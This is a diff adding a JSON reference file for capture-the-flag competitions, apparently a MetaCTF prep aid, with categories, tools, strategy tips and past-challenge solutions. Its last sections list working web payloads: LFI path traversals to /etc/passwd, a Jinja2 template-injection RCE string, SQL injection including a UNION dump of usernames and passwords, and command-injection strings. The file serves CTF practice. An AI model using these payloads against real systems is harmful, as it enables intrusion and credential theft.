@@ -1,0 +1,265 @@
+{
+  "ctf_categories": {
+    "web": {
+      "priority": 1,
+      "description": "Web application vulnerabilities",
+      "common_challenges": [
+        "Client-side JavaScript bypass",
+        "SQL Injection",
+        "XSS (Cross-Site Scripting)",
+        "Command Injection",
+        "LFI/RFI (Local/Remote File Inclusion)",
+        "SSTI (Server-Side Template Injection)",
+        "SSRF (Server-Side Request Forgery)",
+        "JWT vulnerabilities",
+        "Authentication bypass",
+        "Insecure Direct Object Reference"
+      ],
+      "quick_wins": [
+        "View page source for hardcoded credentials/flags",
+        "Check comments in HTML/JS",
+        "Look for base64 encoded strings",
+        "Check robots.txt, .git, .env",
+        "Inspect JavaScript for client-side validation",
+        "Check cookies and localStorage",
+        "Look for hidden form fields"
+      ],
+      "tools": ["burpsuite", "browser_devtools", "curl", "sqlmap", "ffuf", "dirbuster"]
+    },
+    "crypto": {
+      "priority": 2,
+      "description": "Cryptography challenges",
+      "common_challenges": [
+        "Caesar/ROT cipher",
+        "Vigenere cipher",
+        "XOR encryption",
+        "RSA vulnerabilities",
+        "AES/DES weaknesses",
+        "Hash cracking",
+        "Substitution ciphers",
+        "Encoding chains (base64, hex)"
+      ],
+      "quick_wins": [
+        "Try ROT13 first",
+        "Check for base64/hex encoding",
+        "Frequency analysis for substitution",
+        "Look for common RSA attacks (small e, common n)",
+        "Try common passwords for hashes"
+      ],
+      "tools": ["cyberchef", "hashcat", "john", "rsactftool", "python"]
+    },
+    "forensics": {
+      "priority": 3,
+      "description": "Digital forensics and file analysis",
+      "common_challenges": [
+        "File carving",
+        "Steganography",
+        "Memory analysis",
+        "Disk image analysis",
+        "Network packet analysis",
+        "Metadata extraction",
+        "Hidden data in files"
+      ],
+      "quick_wins": [
+        "Run strings on binary files",
+        "Check file headers with xxd/hexdump",
+        "Use binwalk for embedded files",
+        "Check EXIF data in images",
+        "Look for trailing data after file end"
+      ],
+      "tools": ["binwalk", "foremost", "volatility", "wireshark", "exiftool", "steghide"]
+    },
+    "reversing": {
+      "priority": 4,
+      "description": "Reverse engineering binaries",
+      "common_challenges": [
+        "Static analysis",
+        "Dynamic analysis",
+        "Anti-debugging bypass",
+        "Obfuscation",
+        "License key generation",
+        "Malware analysis"
+      ],
+      "quick_wins": [
+        "Run strings first",
+        "Check for debug symbols",
+        "Look for strcmp/memcmp for password checks",
+        "Use ltrace/strace on Linux",
+        "Check for XOR obfuscation"
+      ],
+      "tools": ["ghidra", "ida", "radare2", "gdb", "x64dbg", "dnspy"]
+    },
+    "pwn": {
+      "priority": 5,
+      "description": "Binary exploitation",
+      "common_challenges": [
+        "Buffer overflow",
+        "Format string",
+        "Return-oriented programming (ROP)",
+        "Heap exploitation",
+        "Race conditions",
+        "Integer overflow"
+      ],
+      "quick_wins": [
+        "Check for ASLR/PIE/NX/Canary protections",
+        "Look for gets(), strcpy(), printf() calls",
+        "Find win functions or /bin/sh strings",
+        "Check for format string vulnerabilities"
+      ],
+      "tools": ["pwntools", "gdb-peda", "ropper", "one_gadget", "checksec"]
+    },
+    "osint": {
+      "priority": 6,
+      "description": "Open Source Intelligence gathering",
+      "common_challenges": [
+        "Social media investigation",
+        "Geolocation",
+        "Username/email enumeration",
+        "Historical data lookup",
+        "Domain/IP research"
+      ],
+      "quick_wins": [
+        "Google dorking",
+        "Wayback Machine",
+        "Social media search tools",
+        "WHOIS lookup",
+        "Reverse image search"
+      ],
+      "tools": ["sherlock", "maltego", "recon-ng", "theHarvester"]
+    },
+    "misc": {
+      "priority": 7,
+      "description": "Miscellaneous challenges",
+      "common_challenges": [
+        "Esoteric languages",
+        "QR codes",
+        "Audio analysis",
+        "Network protocols",
+        "Custom encodings"
+      ],
+      "quick_wins": [
+        "Google the challenge text",
+        "Check for known patterns",
+        "Try online decoders",
+        "Look for repeating patterns"
+      ],
+      "tools": ["cyberchef", "dcode.fr", "online tools"]
+    }
+  },
+  "metactf_specific": {
+    "format": "jeopardy",
+    "typical_duration": "3 hours",
+    "challenge_count": "5-10",
+    "difficulty": "beginner to intermediate",
+    "past_challenges": {
+      "snowfall_wishes": {
+        "category": "web",
+        "technique": "client-side js bypass",
+        "solution": "View source, find base64 encoded flag in JavaScript",
+        "lesson": "Always check page source and decode suspicious strings"
+      },
+      "perl_poetry": {
+        "category": "web",
+        "technique": "LFI via Perl open()",
+        "solution": "Exploit two-parameter open() with pipe for command injection",
+        "lesson": "Legacy code vulnerabilities, check for common LFI paths"
+      },
+      "gigs": {
+        "category": "web",
+        "technique": "CVE exploitation",
+        "solution": "Use known Gogs CVE for RCE",
+        "lesson": "Identify software versions, search for known CVEs"
+      },
+      "santas_calculator": {
+        "category": "web",
+        "technique": "JIT compilation reversing",
+        "solution": "Reverse compiled JavaScript to find flag",
+        "lesson": "Modern obfuscation techniques require deeper analysis"
+      }
+    }
+  },
+  "flash_ctf_strategy": {
+    "time_management": {
+      "first_15_min": "Scan all challenges, identify quick wins",
+      "main_phase": "Focus on solvable challenges by category strength",
+      "last_30_min": "Revisit stuck challenges with fresh eyes"
+    },
+    "approach": [
+      "Read challenge description carefully for hints",
+      "Check provided files/URLs for obvious clues",
+      "Start with categories you're strongest in",
+      "Don't spend more than 30 min on one challenge",
+      "Keep notes of findings for potential connections"
+    ]
+  },
+  "flag_patterns": [
+    "flag{...}",
+    "FLAG{...}",
+    "ctf{...}",
+    "CTF{...}",
+    "meta{...}",
+    "MetaCTF{...}",
+    "picoCTF{...}",
+    "HTB{...}",
+    "THM{...}",
+    "KCTF{...}",
+    "knight{...}"
+  ],
+  "common_paths_to_check": [
+    "/robots.txt",
+    "/.git/config",
+    "/.env",
+    "/flag.txt",
+    "/flag",
+    "/admin",
+    "/backup",
+    "/.htaccess",
+    "/config.php",
+    "/debug",
+    "/api/",
+    "/swagger",
+    "/graphql"
+  ],
+  "lfi_payloads": [
+    "../../../etc/passwd",
+    "....//....//....//etc/passwd",
+    "/etc/passwd",
+    "php://filter/convert.base64-encode/resource=index.php",
+    "php://input",
+    "data://text/plain;base64,",
+    "/proc/self/environ",
+    "/var/log/apache2/access.log"
+  ],
+  "ssti_payloads": {
+    "detection": [
+      "{{7*7}}",
+      "${7*7}",
+      "<%= 7*7 %>",
+      "#{7*7}",
+      "*{7*7}"
+    ],
+    "jinja2_rce": [
+      "{{config}}",
+      "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+      "{{''.__class__.__mro__[1].__subclasses__()}}"
+    ]
+  },
+  "sqli_payloads": [
+    "' OR '1'='1",
+    "' OR 1=1--",
+    "admin'--",
+    "1' UNION SELECT null,null--",
+    "' UNION SELECT username,password FROM users--"
+  ],
+  "command_injection": [
+    "; id",
+    "| id",
+    "|| id",
+    "& id",
+    "&& id",
+    "`id`",
+    "$(id)",
+    "; cat /etc/passwd",
+    "| cat flag.txt"
+  ]
+}
